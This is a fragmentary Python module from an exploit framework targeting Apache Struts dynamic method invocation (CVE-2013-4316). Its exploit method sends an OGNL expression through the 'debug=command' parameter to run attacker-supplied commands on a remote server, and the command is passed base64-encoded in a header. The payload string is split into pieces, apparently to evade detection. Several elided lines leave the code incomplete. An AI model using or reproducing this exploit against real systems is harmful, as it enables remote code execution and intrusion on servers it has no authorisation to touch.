...
class Module:
    def __init__(self,Main):
        self.main=Main
        self.info={
            'Name':'Apache Struts Dynamic Method Invocation',
            'Author':'sushan',
            ...
            'Comments':'http://www.cvedetails.com/cve/CVE-2013-4316'
        }
        self.options={
            'RHOST':{
...
(#context['co'+'m.ope'+'nsymph'+'ony.xwo'+'rk2.disp'+'atcher.Htt'+'pSe'+'rvletRe'+'sponse'].getWriter().close())\
'''
        xx=req.post({'Content-Type':'application/x-www-form-urlencoded'},'pic=1&debug=command&ups=2&expression='+quote(a))
        try:
    ...
    def exploit(self,cmd):
        req=http.Http(self.options)
        xx=req.post({'Content-Type':'application/x-www-form-urlencoded','x-ids':base64.b64encode(cmd)},'pic=1&debug=command&ups=2&expression='+quote(self.payload(cmd)))
